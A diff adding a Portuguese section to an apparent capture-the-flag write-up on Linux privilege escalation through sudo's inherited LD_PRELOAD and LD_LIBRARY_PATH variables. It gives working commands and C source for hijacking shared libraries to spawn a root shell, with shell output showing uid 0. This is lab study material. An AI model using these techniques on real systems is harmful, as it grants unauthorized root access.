@@ -230,3 +230,134 @@ sh-4.1#
 
 Para responder a questão b, basta realizar pesquisa no site GTFOBins.
 
+## 7 - Sudo - Environment Variables 
+
+O sudo pode ser configurado para herdar certas variáveis de ambiente do usuário.
+
+Para checar tais informações, além das permissões, executa-se:
+
+```shell
+sudo -l
+```
+Saída com a parte de interesse:
+
+```shell
+user@debian:~$ sudo -l
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+```
+**LD_PRELOAD** e **LD_LIBRARY_PATH** são herdados do ambiente do usuário. **LD_PRELOAD** carrega um objeto compartilhado antes de qualquer outro quando um programa é executado. **LD_LIBRARY_PATH** fornece uma lista de diretórios onde as bibliotecas compartilhadas são pesquisadas primeiro.
+
+Na VM usada na room, já existe um código para geração de um objeto compartilhado, a fim de demonstrar a exploração.
+
+Para criar o objeto, execute:
+
+```shell
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+```
+
+A biblioteca (arquivo .so) foi criada e está no diretório ***/tmp***.
+
+Agora, é possível executar um dos programas que se tenha permissão para executar via sudo (listado ao executar sudo -l), mas pode-se configurar a variável de ambiente LD_PRELOAD para o caminho completo do novo objeto compartilhado:
+
+```shell
+sudo LD_PRELOAD=/tmp/preload.so program-name-here
+```
+Por exemplo:
+
+```shell
+user@debian:~$ sudo -l
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+User user may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+user@debian:~$ sudo LD_PRELOAD=/tmp/preload.so vim
+root@debian:/home/user# id
+uid=0(root) gid=0(root) groups=0(root)
+root@debian:/home/user# 
+```
+
+No exemplo acima, foi utilizado o vim, que está na lista de binários que o usuário pode executar com sudo. Obteve-se um shell como usuário root.
+
+Para listar quais bibliotecas determinado programa utiliza, basta usar o comando ldd. Por exemplo:
+
+```shell
+root@debian:/home/user# ldd /usr/sbin/apache2
+        linux-vdso.so.1 =>  (0x00007fff4e3b4000)
+        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f0b9dae5000)
+        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f0b9d8c1000)
+        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f0b9d687000)
+        libpthread.so.0 => /lib/libpthread.so.0 (0x00007f0b9d46b000)
+        libc.so.6 => /lib/libc.so.6 (0x00007f0b9d0ff000)
+        libuuid.so.1 => /lib/libuuid.so.1 (0x00007f0b9cefa000)
+        librt.so.1 => /lib/librt.so.1 (0x00007f0b9ccf2000)
+        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f0b9cabb000)
+        libdl.so.2 => /lib/libdl.so.2 (0x00007f0b9c8b6000)
+        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f0b9c68e000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007f0b9dfa2000)
+```
+
+Um outra técnica de exploração para elevar privilégios é gerar uma biblioteca com o mesmo nome que um binário usa de forma compartilhada. Para ilustrar, observe a geração de uma lib com o mesmo nome de uma utilizada pelo apache2:
+
+```shell
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+```
+Novamente, a lib "disfarçada" foi gerada no diretório ***/tmp***.
+
+Para efetivar, ao executar o apache2 com o sudo, informa-se a variável de ambiente LD_LIBRARY_PATH:
+
+```shell
+user@debian:~$ sudo LD_LIBRARY_PATH=/tmp apache2
+
+apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/libaprutil-1.so.0)
+
+root@debian:/home/user# 
+```
+Percebe-se que foi gerado um shell de root.
+
+Na task é proposto o seguinte desafio:
+
+Saia da shell de root. Tente renomear /tmp/libcrypt.so.1 para o nome de outra biblioteca usada pelo apache2  (listadas com o comando ldd mais acima) e execute novamente o apache2 usando sudo novamente. Funcionou? Se não, tente descobrir por que não, e como o código library_path.c pode ser alterado para fazê-lo funcionar.
+
+Avaliando o código fonte do arquivo library_path.c:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+```
+Para que seja possível chamar qualquer lib, basta alterar o código para:
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_LIBRARY_PATH");
+    setresuid(0,0,0);
+    system("/bin/bash -p");
+}
+```
+
+### Questões:
+
+- a. ***Read and follow along with the above.*** *Não há necessidade de resposta*
